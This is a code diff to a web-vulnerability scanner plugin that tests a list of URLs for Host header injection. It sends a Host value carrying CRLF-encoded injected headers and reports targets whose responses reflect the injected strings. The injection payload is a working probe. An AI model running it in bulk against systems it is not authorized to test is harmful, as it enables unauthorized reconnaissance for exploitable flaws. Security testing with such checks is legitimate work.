@@ -1,18 +1,28 @@
-#request url = var
+#request urls = array
 #define bug = www.wker.com
 #define bt = 12345/foo
 #define info = 存在HOST主机头注入漏洞
 
 function main(args)
 {
-	res = HttpGet(url,"Host: www.wker.com%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[0],bug,0)!= "-1")
-	{
-		print(url.info);
-	}else{
-		if(StrFindStr(res[0],bt,0)!= "-1")
-		{
-			print(url.info);
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpGet(url,"Host: www.wker.com%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}else{
+				if(StrFindStr(res[0],bt,0)!= "-1")
+				{
+					printclolor("[+]".urls[i].info,3);
+				}
+			}
+		}catch{
 		}
+		i = ToInt(i+1);
 	}
 }
